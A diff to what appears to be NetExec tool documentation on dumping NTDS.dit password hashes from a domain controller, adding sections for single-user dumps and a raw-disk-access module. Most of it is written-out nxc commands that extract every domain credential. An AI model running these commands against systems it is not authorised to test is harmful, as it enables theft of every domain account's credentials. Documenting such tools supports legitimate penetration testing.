@@ -13,10 +13,11 @@ Requires Domain Admin or Local Admin Priviledges on target Domain Controller
 			vss - Uses the Volume Shadow copy Service  
 ```
 
+### Dump all users from the NTDS.dit
+
 ```bash
 nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds
-nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users
-nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users --enabled
+nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --enabled
 nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds vss
 ```
 
@@ -24,12 +25,32 @@ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds vss
 You can also DCSYNC with the computer account of the DC
 {% endhint %}
 
-There is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py&#x20;
+### Dump a specific user only
+
+```bash
+nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --user Administrator
+```
+
+{% hint style="warning" %}
+In environments with multiple domains (e.g., parent/child), make sure to specify the full NetBIOS format when using --user, such as: **--user NETBIOS/Administrator**. This avoids ambiguity when the same username exists in different domains.
+{% endhint %}
+
+### Dump NTDS using ntdsutil
+
+There is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py
 
 ```bash
 nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil
 ```
 
-Remember to play this music everytime you got DA
+### Dump NTDS using raw disk access
 
-{% embed url="https://www.youtube.com/watch?v=SyjUwhBYa6Q" %}
+The ntds-dump-raw module will use raw disk access to extract NTDS.dit and SYSTEM hive by reading directly from the physical drive and parse them locally with secretsdump.py
+
+```bash
+nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntds-dump-raw -o TARGET=NTDS
+```
+
+{% hint style="warning" %}
+If you are encountering command execution errors, specify an alternative execution method such as --exec-method wmiexec or --exec-method atexec
+{% endhint %}
